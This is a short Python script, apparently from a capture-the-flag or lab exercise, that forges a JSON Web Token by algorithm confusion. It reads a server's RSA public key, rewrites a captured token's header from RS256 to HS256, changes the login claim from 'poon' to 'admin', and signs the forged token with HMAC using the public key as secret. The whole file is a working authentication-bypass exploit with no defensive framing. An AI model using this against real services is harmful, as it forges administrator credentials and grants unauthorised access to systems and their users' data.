import hmac
import hashlib
import base64
import binascii

public_key = open('public.pem')

key = public_key.read()

orig_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InBvb24ifQ.XlVcQ0kUAsFyjm5QvDVAT8eSAvJ3jE_5X-0Z0OMlG5t4CJwZRERINdTjbgyJjL1jQVVWxv4WdsjXSS_KFzovHNr5vNblw1mQT7x8lktjFq_BFK6fpX9CuronRVUCQpbhZ4FmglYuqvZlOZuIiooosrjA41eeZuhkhx5CFtkZt2nAn8u3uLX6uZPFE3Sed-JCJIkjBeSqP7zCHvITjCn3lFj5E56jpZiMzXCyHUCUIaUJ7teMX014pEoeT3h-zZj738wR2M7cdyjXZzt1lTUGIPgQSfKX9_h2VNisagZinLpWgYD8PG4X3iw4d1vV7fodF6fjC2WnA5OZaUe0LM3VkQ"

particles = orig_jwt.split(".")

def padding(part):
    if len(part) % 4 != 0:
        padding = 4- (len(part) % 4)
        return part + ("="*padding)
    return part

def sign(part, key):
    return base64.urlsafe_b64encode(hmac.new(key.encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

header = base64.b64decode(padding(particles[0])).decode("utf-8")
body = base64.b64decode(padding(particles[1])).decode("utf-8")

header = header.replace("RS256","HS256")
body = body.replace("poon","admin")

print(header)
print(body)

header = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=")
body = base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")

payload = header + "." + body
print(payload)

signature = sign(payload, key)
print(payload + "." + signature)
